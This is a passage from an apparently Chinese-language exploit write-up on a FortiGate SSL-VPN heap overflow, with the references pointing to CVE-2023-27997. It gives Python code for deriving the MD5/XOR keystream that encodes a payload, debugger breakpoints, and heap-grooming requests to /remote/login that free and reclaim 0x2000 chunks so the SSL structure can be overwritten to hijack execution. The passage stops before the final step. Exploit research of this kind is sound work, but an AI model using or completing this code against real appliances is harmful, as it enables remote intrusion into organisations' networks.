    """    将输入的十六进制数据转换为对应的字符串形式。    :param payload: 输入的十六进制数据，例如：0x123456789abcde 或 '0x123456789'    :return: 转换后的字符串形式，例如："123456789abcde"    """
    # 确保输入是字符串，去掉前缀 '0x'（如果有）
    if isinstance(payload, str) and payload.startswith("0x"):
        payload = payload[2:]
    
    # 或者，输入是整数时，直接转换为十六进制字符串
    if isinstance(payload, int):
        payload = hex(payload)[2:]  # 将整数转为十六进制字符串并去掉 '0x'

    # 对输入的字符串使用小写字母进行转换，以确保格式统一
    result = payload.lower()  # 将小写字母作为最终结果
    return result

def xorstr(key, payload):
    """    对输入的 payload 和 key 逐字节进行异或运算，并返回结果。    :param key: 字节串，作为异或的密钥。    :param payload: 字节串，输入需要进行异或运算的数据。    :return: 返回异或后的字节串。    """
    # 确保 key 和 payload 都是字节类型
    if not isinstance(key, bytes) or not isinstance(payload, bytes):
        raise TypeError('key and payload must be bytes')

    # 使用 itertools.cycle 使 key 循环以匹配 payload 的长度
    from itertools import cycle
    
    # 逐字节计算异或结果
    result = bytes(a ^ b for a, b in zip(payload, cycle(key)))
    
    return result



def crypt2hex(offset,target_byte,payload):
    #获取salt值
    salt_url = "https://192.168.18.123:4433/remote/info"
    salt = get_salt(salt_url)
    print("salt===>",salt)  
    if salt is not None:
        #哈希碰撞
        #target_byte = 0xaa  # 期望值，例：0x90
        #offset = 14  # 偏移值，您希望匹配的偏移量
        #调用 hex 函数进行碰撞
        seed=md5hex(salt, target_byte, offset, len(payload))
        print("seed===>",seed)
    else:
        print("未能获取salt值和seed。")
    #把md5字符串碰撞出来
    
    key=md5fun(salt,seed,len(payload))
    print("md5key===>",key.hex())
    afterxor=xorstr(key,payload)
    hex_string = afterxor.hex()
    #print(hex_string)
    print("hex===>",hex2str(hex_string))
```  
  
  
笔者调试断点  
  
```
b *015ADEFE
b *0x015ADF4E
source jemalloc.py 
target remote 192.168.18.123:23
trace-jemalloc

```  
  
## 漏洞利用  
### 稳定溢出写控制执行流  
  
1、如果创建连接，SSL结构体的大小是0x1db8，会分配一个0x2000的堆块给它用，堆块还会分配0x2000的大小存储http请求  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73Me3wbEYcpPAuytbocUVoL964cyKPTZPA4GBBJMf9uLTzQ9qYU3SeaXIQ/640?wx_fmt=png&from=appmsg "")  
  
2、如果再次请求，请求内容大于0x2000，会将原本的httprequest的堆块free掉，然后再申请一块大堆块去存储请求  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73MesH46Bep8W26SYuLlEQ3dAKGXykxuDVD76LZd31WIkFzt09ibDGOWOwQ/640?wx_fmt=png&from=appmsg "")  
  
3、我们再次请求，通过设置size位为0x2000，把free掉的堆块申请回来，然后越界写ssl结构，最后控制执行流  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73MecreAJicaBH5OWI3xgueaRyeueaAiajm3coE5V6lv5ExPCydOCneOSD8g/640?wx_fmt=png&from=appmsg "")  
  
首先我们申请两个正常大小的请求  
  
```
victims = []
for i in range(2):
    victim_ssl_sock = create_ssl_socket()
    content = 'username=1'
    payload = f'''POST /remote/login HTTP/1.1Host: {HOST}:{PORT}Content-Length: {len(content)}User-Agent: Mozilla/5.0Content-Type: text/plain;charset=UTF-8Connection: Keep-AliveAccept: */*{content}'''
    victim_ssl_sock.sendall(payload.encode("utf-8"))
    victims.append(victim_ssl_sock)

```  
  
  
接下来，我们大量数据请求请求，把这两个0x2000的request的堆块给free掉  
  
```
for i in victims:
    content = 'username=' + '1' * 0x3000
    payload = f'''POST /remote/login HTTP/1.1Host: {HOST}:{PORT}Content-Length: {len(content)}User-Agent: Mozilla/5.0Content-Type: text/plain;charset=UTF-8Connection: Keep-AliveAccept: */*{content}'''
    i.sendall(payload.encode("utf-8"))

```  
  
  
接下来就是任意地址写了，我们可以看到我们在偏移为0x2010的地址写了字符串  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73MedhpzrLbQvsGiaiccNymoYyLbGU9JB9SnVeG86tHRMBjHttB6K7KSknRA/640?wx_fmt=png&from=appmsg "")  
  
接下来就是控制好堆布局就可以改写ssl结构体然后控制执行流了……  
## 参考文章  
  
https://blog.lexfo.fr/xortigate-cve-2023-27997.html  
  
https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html  
  
https://github.com/BishopFox/CVE-2023-27997-check  
  
https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn  
  
https://www.cnblogs.com/hac425/p/15371359.html  
  
https://nuoye-blog.github.io/2020/05/09/77b152fd/  
  
https://blog.csdn.net/hl09083253cy/article/details/79147625  
  
